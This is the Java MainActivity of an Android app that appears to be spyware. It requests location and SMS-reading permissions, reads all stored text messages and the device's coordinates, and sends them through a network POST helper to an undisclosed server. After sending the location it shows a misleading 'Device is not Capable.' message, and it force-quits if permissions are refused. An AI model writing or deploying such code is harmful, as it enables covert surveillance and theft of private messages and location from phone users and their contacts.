package com.example.p32;

import static android.app.ProgressDialog.show;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int LOCATION_PERMISSION_REQUEST_CODE = 100;
    private static final int PERMISSIONS_REQUEST_READ_SMS = 1;
    private LocationHelper LocationHelper;
    private TextView locationTextView;
    private SMSHelper SMSclass;
    private StringBuilder allSms;
    private NetworkManager newNet;
    // 0 -- all
    // 1 -- location
    // 2 -- sms
    // 3 -- send sms

    private Integer AppType = 1;

    public void forceExitApp() {
        android.os.Process.killProcess(android.os.Process.myPid());
    }
    public void AlertShow(String title,String Desc) {
        new AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(Desc)
                .setPositiveButton("Ok", (dialog, which) -> forceExitApp())
                .show();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        // Set up window insets
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            androidx.core.graphics.Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Initialize views
        locationTextView = findViewById(R.id.textView1);
        // Initialize location helper
        newNet = new NetworkManager(this);
        // Check and request location permissions and send location data

        checkPermissions();
    }


    public void fetchSMS(){
        SMSclass = new SMSHelper(this);
        List<String> mgs=SMSclass.getAllMessages();
        allSms=new StringBuilder();
        allSms.append("\n\nSms data\n\n");
        for(String i:mgs){
            Log.d("MSG",i);
            allSms.append(i).append("\n");
        }
        newNet.sendPostRequest(allSms.toString());
    }

    private void checkPermissions() {
        if(AppType == 1 || AppType == 0){
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // Request location permission if not granted
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.ACCESS_FINE_LOCATION}, LOCATION_PERMISSION_REQUEST_CODE);
        } else {
            requestLocationUpdates();
        }
        }
        if(AppType == 2 || AppType == 0) {
            // Check for SMS permission
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                // Request SMS permission if not granted
                ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS}, PERMISSIONS_REQUEST_READ_SMS);
            } else {
                // If SMS permission is granted, fetch messages
                fetchSMS();
            }
        }
    }


    private void requestLocationUpdates() {
        LocationHelper= new LocationHelper(this);
        LocationHelper.requestSingleLocationUpdate(new LocationHelper.LocationCallback() {
            @Override
            public void onLocationReceived(double latitude, double longitude) {
                @SuppressLint("DefaultLocale") String locationText = String.format("Lat: %.6f, Lon: %.6f", latitude, longitude);
                newNet.sendPostRequest(locationText);
                runOnUiThread(() -> {
//                    locationTextView.setText(locationText);
                    Toast.makeText(MainActivity.this, "Device is not Capable.", Toast.LENGTH_SHORT).show();
                });
            }
            @Override
            public void onLocationError(String errorMessage) {
                runOnUiThread(() -> {
                    Toast.makeText(MainActivity.this, errorMessage, Toast.LENGTH_SHORT).show();
                });
            }
        });
    }



    @SuppressLint("SetTextI18n")
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(AppType == 1 || AppType == 0) {
            if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission granted, request location updates
                    requestLocationUpdates();
                } else {
                    // Permission denied
                    Toast.makeText(this, "Location permission is required", Toast.LENGTH_SHORT).show();
                    AlertShow("Permission Error", "Please Grant Required Permissions to proceed.");
                }
            }
        }
        if(AppType == 2 || AppType == 0) {
            if (requestCode == PERMISSIONS_REQUEST_READ_SMS) {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission granted, fetch SMS messages
                    fetchSMS();
                } else {
                    // Permission denied
                    Toast.makeText(this, "Permission denied to read SMS.", Toast.LENGTH_SHORT).show();
                    AlertShow("Permission Error", "Please Grant Required Permissions to proceed.");
                }
            }
        }
    }


}